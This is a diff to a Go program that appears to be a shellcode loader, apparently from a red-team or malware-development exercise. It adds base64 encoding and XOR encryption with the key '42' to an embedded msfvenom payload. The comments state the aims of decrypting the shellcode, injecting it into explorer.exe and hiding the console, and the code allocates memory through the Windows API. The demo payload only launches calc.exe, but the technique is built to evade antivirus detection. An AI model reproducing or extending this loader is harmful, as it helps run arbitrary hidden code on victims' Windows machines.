@@ -4,6 +4,7 @@ import (
 	"fmt"
 	"unsafe"
 	_ "embed"
+	b64 "encoding/base64"
 	"golang.org/x/sys/windows"
 )
 
@@ -13,9 +14,21 @@ var (
 	CreateThread  = kernel32DLL.NewProc("CreateThread")
 )
 
-//go:embed sc.bin
+//go:embed sc.xor.42.b64
 //msfvenom -p windows/x64/exec CMD='cmd.exe /c calc.exe' -f raw
-var sc []byte 
+// XOR Encrypted with '42'
+var enc_sc_b64 string 
+
+// https://kylewbanks.com/blog/xor-encryption-using-go
+// EncryptDecrypt runs a XOR encryption on the input string, encrypting it if it hasn't already been,
+// and decrypting it if it has, using the key provided.
+func EncryptDecrypt(input, key string) (output []byte) {
+	for i := 0; i < len(input); i++ {
+			output = append(output, input[i] ^ key[i % len(key)])
+	}
+
+	return output
+}
 
 func main() {
 	// objectives:
@@ -23,6 +36,10 @@ func main() {
 	// decrypt shellcode (XOR)
 	// inject shellcode into explorer.exe
 	// get rid of console window (pop up)
+
+	key := "42"
+	enc_sc, _ := b64.StdEncoding.DecodeString(enc_sc_b64)
+	sc := EncryptDecrypt(string(enc_sc), key)
 
 	// Allocate a memory buffer for the payload
 	addr, err := windows.VirtualAlloc(
